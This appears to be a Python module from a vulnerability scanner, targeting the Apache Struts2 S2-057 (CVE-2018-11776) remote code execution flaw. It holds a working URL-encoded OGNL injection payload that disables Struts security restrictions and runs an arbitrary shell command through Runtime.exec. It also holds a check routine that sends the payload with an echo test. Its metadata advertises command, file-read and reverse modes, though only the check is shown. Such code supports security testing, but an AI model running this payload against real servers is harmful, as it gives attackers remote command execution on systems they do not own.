#!/usr/bin/env python3

from app.lib.request import request
from app.lib.encode import urlencode
from app.lib.common import get_capta, get_useragent

class S2_057_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'S2-057漏洞,又名CVE-2018-11776漏洞',
            'description': 'Struts2 Remote Code Execution Vulnerability, Apache Struts 2.0.4 - Struts 2.3.34, Struts 2.5.0 - Struts 2.5.16',
            'date': '2018-08-22',
            'exptype': 'check,cmd,read,reverse',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.capta = get_capta() 
        self.headers = {
            'User-Agent': get_useragent()
        }
        self.payload = '''/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/actionChain1.action'''
    
    async def check(self):

        """
        检测是否存在漏洞

        :param:
        :return bool True or False: 是否存在漏洞
        """
        
        try:
            check_req = await request.get(self.url + self.payload.format(cmd = urlencode('echo ' + self.capta)), headers = self.headers)
            if self.capta in await check_req.text() and len(await check_req.text()) < 100:
                return True
            
        except Exception as e:
            # print(e)
            pass
    
if  __name__ == "__main__":
    S2_057 = S2_057_BaseVerify('http://127.0.0.1:8080/struts2-showcase')